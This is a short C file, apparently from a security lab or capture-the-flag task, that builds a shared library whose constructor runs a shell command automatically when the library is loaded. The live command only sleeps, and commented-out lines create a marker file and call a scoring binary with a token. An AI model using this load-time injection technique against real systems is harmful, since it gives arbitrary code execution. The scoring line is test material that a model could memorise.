#include<stdio.h>
#include<stdlib.h>

/*
build: gcc -shared -o attack.so -fPIC attack.c
*/

static void malicious() __attribute__((constructor));

void malicious() {
//    system("touch /tmp/owned");
//    system("/usr/local/bin/score d8500581-b77c-4f2e-813a-77eda1a9c6e6"); 
    system("sleep 20");
}
